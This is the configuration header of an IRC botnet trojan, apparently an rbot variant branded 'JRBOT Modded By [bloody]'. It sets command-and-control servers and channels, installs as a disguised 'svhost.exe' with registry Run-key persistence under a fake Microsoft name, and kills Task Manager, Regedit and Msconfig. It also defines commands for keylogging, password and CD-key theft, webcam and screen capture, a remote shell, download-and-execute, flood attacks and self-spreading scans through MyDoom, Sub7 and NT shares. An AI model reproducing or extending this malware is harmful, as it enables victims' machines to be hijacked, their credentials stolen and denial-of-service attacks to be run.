
// bot configuration
 char botid[20] = "JRBOT Modded By [bloody]"; // bot id
 char password[13] = ""; // bot password
 char server[] = ""; // server
 //char server[] = "matrix.de.eu.dal.net"; // server
 int port = 31667; // server port
 char serverpass[] = ""; // server password
 char channel[] = "#heinz"; // channel that the bot should join
 char chanpass[8] = ""; // channel password
const char server2[] = ""; // backup server (optional)
 int port2 = 6667; // backup server port
  const char channel2[] = "#fuckme"; // backup channel (optional)
 char chanpass2[9] = ""; // backup channel password (optional)
 const int maxlogins = 3; // maximum number of simultaneous logins
 // Do not change this shit or it wort scan as good
 char exploitmsgchan[6] = "#karl"; //displays exploit msgs.. it can be a nickname or a channel name. e.g. .. = "urnick";
 char filename[11] = "svhost.exe"; // destination file name
 char scanlog[10] = "mrgdf.dat"; //rbot's scanner logging
 char keylogfilename[11] = "ntfsdi.txt"; 
 char prefix = '#'; // command prefix (one character max.)
 const char szLocalPayloadFile[11]= "svhost.exe"; //ntpass payload file


 //live this fucking shit alone
 const int sock4port = 2007; // Port # for sock4 daemon to run on  - CHANGE THIS
 char valuename[34] = "Microsoft Synchronization Manager"; // value name for autostart
 char runkey[50] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
 char servicekey[58] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices";
//u can crypt runkey and service key in case it got detected.. figure out how..

 const int maxaliases = 16; // maximum number of aliases (must be greater than the number of predefined aliases).
 const char bversion[26] = "JrBoT Modded by [bloody]"; // Bots !version reply
 const char version[] = "weee!";
 const char *versionlist[] = {
			//"mIRC32 v6.1 K.Mardam-Bey",
			//"mIRC32 v6.01 K.Mardam-Bey",
			//"mIRC32 v6.03 K.Mardam-Bey",
			//"mIRC32 v6.10 K.Mardam-Bey",
			//"mIRC32 v6.12 K.Mardam-Bey",
	 "JrBoT Modded by [bloody]",
			};

 /* This are for the nick prefix */
 const char nickconst[] = "[hanz]"; // first part to the bot's nick
 const int maxrand = 9; // how many random numbers in the nick

#ifndef NO_HOSTAUTH
 char *authost[] = {
	 "*@*", 
	 "\0" //dont remove this.
 }; // wildcard works
#endif

#ifndef Use_Firewall_killer 
 int killer_delay = 2000;  //kill delay
 //ALL filenames must be in uppercase! 
 char *kill_list[]={ 
   "REGEDIT.EXE", 
   "MSCONFIG.EXE", 
   "TASKMGR.EXE", 
   "TEST.EXE",
   "TASKMON.EXE", 
   NULL //dont remove this line 
}; 
#endif


//on join usermodes
char *usermodes[]={
	"+i",
	"-s",
	NULL
};
//on join chanmodes
char *chanmodes[]={
	"+nts",
//	"+k chanpass",
	NULL
};

 
 /* Here they are newbs... commands.... :p  */
 /* Dont frikin' ask the forums about the commands !!!! */
 /* just change the name inside the " " */

 //No parameter
 char login_cmd[]="login";
 char *logout_cmd[]={"logout","lo"};
 char *rndnick_cmd[]={"rndnick","rn"};
 char *die_cmd[]={"die"}; 
 char *version_cmd[]={"version","ver"}; 
 char *secure_cmd[]={"secure","sec"};
 char sock_cmd[]="sock"; 
 char *quit_cmd[]={"quit","qt"};
 char *reconnect_cmd[]={"reconnect","r"};
 char *disconnect_cmd[]={"disconnect","dc"};
 char *mirccmd_cmd[]={"mirccmd","mc"};
 char *status_cmd[]={"status","s"};
 char *id_cmd[]={"id","i"};
 char *threads_cmd[]={"threads","t"};
 char *aliases_cmd[]={"alias","al"};
 char log_cmd[]="log";
 char *netinfo_cmd[]={"netinfo","ni"};
 char *sysinfo_cmd[]={"sysinfo","si"};
 char *remove_cmd[]={"remove","rm"};
 char ntstop_cmd[]="ntstop";
 char ntdel_cmd[]="ntdel";
 char ntstats_cmd[]="ntstats"; // buggy.. fix this.. :)
 char *getcdkey_cmd[]={"getcdkey","cdkeys"};
 char *activewindow_cmd[]={"activewin","aw"};
 char *passwords_cmd[]={"passwords","passes"};
 char driver_cmd[]="drivers";
 char hascam_cmd[]="checkcam";
 char gennick_cmd[]="gn";
 char uptimenick_cmd[]="upnick";
 char spythreadlist_cmd[]="st";
 char opencmd_cmd[]="opencmd"; //opens remote cmd
 char listprocesses_cmd[]="pl";

//One parameter 
 char killprocess_cmd[]="kp";
 char *scrcap_cmd[]={"screencap","sc"}; //from wisdom //sc c:\x.bmp 
 char nick_cmd[]="nick";
 char join_cmd[]="join";
 char part_cmd[]="part";
 char raw_cmd[]="raw";
 char killthread_cmd[]="k";
 char prefix_cmd[]="prefix";
 char openfile_cmd[]="open";
 char server_cmd[]="server";
 char dns_cmd[]="dns";
 char *gethost_cmd[]={"gethost","gh"};
 char *hostjoin_cmd[]={"hostjoin","hj"};
 char *visit_cmd[]={"visit","v"};
 char keylog_cmd[]="keylog";//.keylog <destination> #chan or nick
 char ktname_cmd[]="kt"; 
 //char list_cmd[]="list";
 char remotecmdcmds_cmd[]="cmd"; // do this after opencmd command.. //.cmd netstat
 

 //clone command
 char clone_rndnick[]="crndnick";
 char clone_quit[]="cquit";
 char clone_raw[]="craw";
 char clone_mode[]="cmode";
 char clone_nick[]="cnick";
 char clone_join[]="cjoin";
 char clone_part[]="cpart";
 char clone_cmd[]="clone";
 char clone_privmsg[]="cprivmsg";
 char clone_action[]="caction";

//Two parameter
 char ntscan_cmd[]="ntscan"; //ntscan <threads> <minutes> <iprange> .ntscan 100 120 211
 char addalias_cmd[]="alias";
 char privmsg_cmd[]="privmsg";
 char action_cmd[]="action";
 char cycle_cmd[]="cycle";
 char mode_cmd[]="mode";
 char repeat_cmd[]="repeat";
 char delay_cmd[]="delay";
 char update_cmd[]="update";
 char execute_cmd[]="execute";
 char httpd_cmd[]="httpd"; //httpd <port> <root> .httpd 80 c:\ 
 char spykillthread_cmd[]="sk"; 
 char shell_cmd[]="shell";

//Three parameter
 char syn_cmd[]="syn";
 char download_cmd[]="dld";
 char redirect_cmd[]="redirect";
 char scan_cmd[]="scan"; //scancommand <ip> <port> <delay in !SECONDS!> <extra> | if extra is = doom ..will spread mydoom ..  or if extra is log it will log ...;p 
 //<extra> can be doom,optix,sub7,devil,kuang..
 char rscan_cmd[]="rscan"; // random scanner - rscan <A> <B> <port> <delay> <extra> .rscan 81 115 901 5 doom

//Four parameter
// char spyscan_cmd[]="spyscan"; //spyscan_command [start ip] [port] [delay in sec.] [spreaders?] [log to file file] //removed doesnt work for me
 char udp_cmd[]="upd";
 char ping_cmd[]="ping";
 char email_cmd[]="email"; 
 char sendkeys_cmd[]="sendkey";
 char wccapture_cmd[]="wccap"; //capture frame <save as> <index> <width> <height> - captures a frame (bitmap) from a video for windows device *from wisdom
 char wcvideo_cmd[]="wcvideo"; //capture video <save as> <index> <time> <width> <height> - captures a video (avi) from a video for windows device *from wisdom
//havent tested yet. i dont have a webcum.
  


